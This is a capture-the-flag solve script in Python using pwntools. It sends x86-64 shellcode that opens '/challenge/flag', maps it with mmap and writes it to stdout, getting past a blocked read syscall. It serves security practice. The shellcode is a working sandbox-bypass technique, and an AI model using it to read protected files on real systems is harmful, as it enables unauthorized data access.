from pwn import *

CHALL_PATH = "./open_what_write"
COMMANDS = """
b *0x401b83
c
"""


context.arch = "amd64"

if args.GDB:
    c = gdb.debug(CHALL_PATH, COMMANDS)
    #input("wait")
elif args.REM:
    c = remote("open-what-write.ctf.offensivedefensive.it", 8080, ssl=True)
else:
    c = process(CHALL_PATH)

# The point of the challenge was to use mmap instead of read from file because read syscall is blocked
# The shell has three steps: 
# open file flag at /challenge/flag
# map starting from the rsp an area with the file descriptor of the opened file
# the mmap returns in the rax the content of the file (flag)
# then do a write in stdout
shell = """
mov rax, 0x67616c662f6567
push rax
mov rax, 0x6e656c6c6168632f
push rax
mov rdi, rsp
mov rax, 2
syscall
mov r8, rax
mov rdx, 1
mov rdi, rsp
mov r9, 0
mov rsi, 100
mov r10, 2
mov rax, 9
syscall
mov rsi, rax
mov rax, 1
mov rdi, 1
mov rdx, 100
syscall
"""

c.recvuntil(b"Enter your shellcode: ")
c.sendline(asm(shell))

c.interactive()